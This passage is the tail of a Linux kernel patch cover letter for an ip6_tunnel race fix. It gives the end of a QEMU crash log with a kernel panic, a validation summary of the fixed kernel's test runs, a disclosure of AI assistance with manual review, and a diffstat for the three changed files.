[    4.905973] RAX: 000000000000008a RBX: ffff888003313000 RCX: ffffffffb5ed8b55
[    4.906848] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 0000000000000001
[    4.907783] RBP: ffff8880050e3a7c R08: 0000000000000000 R09: fffffbfff711a524
[    4.908665] R10: 0000000000000003 R11: 203a666675626b73 R12: 00000000000000dc
[    4.909547] R13: 0000000000000180 R14: ffff888002c18120 R15: ffff8880050e3a80
[    4.910428] FS:  00007f3b9a1d0640(0000) GS:ffff88807c2d5000(0000) knlGS:0000000000000000
[    4.911438] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.912216] CR2: 00000000006167e0 CR3: 000000000414e001 CR4: 0000000000370ef0
[    4.913107] Kernel panic - not syncing: Fatal exception in interrupt
[    4.914485] Kernel Offset: 0x34c00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
QEMU_EXIT=0

-----END crash log-----

Validation:

The fixed kernel completed the functional IPv4-over-IPv6 test and 200
concurrent changelink/transmit iterations. The runs completed without
KASAN reports, skb_under_panic(), oopses, or panics.

This patch was developed with assistance from Codex:gpt-5.4. The changes
and test results were manually reviewed.

Zixuan Chai (1):
  ip6_tunnel: snapshot encap in xmit

 include/net/ip6_tunnel.h | 10 +++++-----
 include/net/ip_tunnels.h | 10 ++++++++++
 net/ipv6/ip6_tunnel.c    | 18 ++++++++++++++----
 3 files changed, 29 insertions(+), 9 deletions(-)

-- 
2.34.1

